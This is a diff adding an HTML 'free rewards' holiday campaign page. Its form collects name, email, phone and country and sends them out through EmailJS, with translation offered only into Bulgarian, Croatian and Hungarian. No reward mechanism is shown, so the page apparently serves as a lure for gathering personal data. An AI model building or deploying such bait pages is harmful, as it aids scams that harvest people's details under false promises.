@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Christmas and New Year Free Rewards Campaign</title>
+
+    <!-- EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+      body {
+        font-family: "Segoe UI", sans-serif;
+        background: #060c17;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 2rem;
+        color: #172f55;
+      }
+
+      .form-container {
+        max-width: 600px;
+        width: 100%;
+        background: #fff;
+        padding: 2rem;
+        border-radius: 1rem;
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        position: relative;
+      }
+
+      input {
+        width: 100%;
+        padding: 0.8rem;
+        margin-bottom: 1rem;
+        border: 1px solid #ddd;
+        border-radius: 0.5rem;
+      }
+
+      button {
+        background: #172f55;
+        color: #fff;
+        border: none;
+        padding: 0.8rem 1.5rem;
+        border-radius: 0.5rem;
+        cursor: pointer;
+      }
+
+      button:hover {
+        background: #1f2937;
+      }
+
+      .logo {
+        height: 35px;
+        margin-bottom: 1rem;
+      }
+
+      /* Google Translate */
+      #google_translate_element {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+      }
+
+      .goog-te-gadget-simple {
+        border-radius: 6px !important;
+        padding: 5px !important;
+        font-size: 12px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <form class="form-container" id="userForm">
+      <!-- Translator -->
+      <div id="google_translate_element"></div>
+
+      <img class="logo" src="/images/logo.png" alt="Logo" />
+      <img
+        src="/images/banner.png"
+        alt="Banner"
+        style="max-width: 100%; height: auto; margin-bottom: 1rem"
+      />
+
+      <h2>Claim Your Free Rewards Now</h2>
+
+      <label for="fullname">Full Name</label>
+      <input
+        type="text"
+        name="fullname"
+        id="fullname"
+        placeholder="Full Name"
+        required
+      />
+
+      <label for="email">Email</label>
+      <input
+        type="email"
+        name="email"
+        id="email"
+        placeholder="Email address"
+        required
+      />
+
+      <label for="Phone">Phone Number</label>
+      <input type="text" name="phone" id="Phone" placeholder="Phone Number" />
+
+      <label for="country">Country</label>
+      <input
+        type="text"
+        name="country"
+        id="country"
+        placeholder="Country"
+        required
+      />
+
+      <button type="submit">Submit</button>
+    </form>
+
+    <!-- EmailJS -->
+    <script>
+      emailjs.init("VMTJdNDyn5LVZux67");
+
+      document
+        .getElementById("userForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const emailData = {
+            fullname: document.getElementById("fullname").value,
+            email: document.getElementById("email").value,
+            phone: document.getElementById("Phone").value,
+            country: document.getElementById("country").value,
+          };
+
+          Swal.fire({
+            title: "Submitting...",
+            text: "Please wait while we submit your information.",
+            allowOutsideClick: false,
+            didOpen: () => Swal.showLoading(),
+          });
+
+          emailjs
+            .send("service_zkkzfht", "template_srb63mf", emailData)
+            .then(() => {
+              Swal.fire({
+                icon: "success",
+                title: "Submitted!",
+                text: "Your information has been sent successfully.",
+                confirmButtonColor: "#172f55",
+              });
+              document.getElementById("userForm").reset();
+            })
+            .catch((error) => {
+              console.error("EmailJS Error:", error);
+              Swal.fire({
+                icon: "error",
+                title: "Submission Failed",
+                text: "Something went wrong. Please try again later.",
+                confirmButtonColor: "#d33",
+              });
+            });
+        });
+    </script>
+
+    <!-- Google Translate -->
+    <script>
+      function googleTranslateElementInit() {
+        new google.translate.TranslateElement(
+          {
+            pageLanguage: "en",
+            includedLanguages: "bg,hr,hu",
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+          },
+          "google_translate_element"
+        );
+      }
+    </script>
+
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+  </body>
+</html>
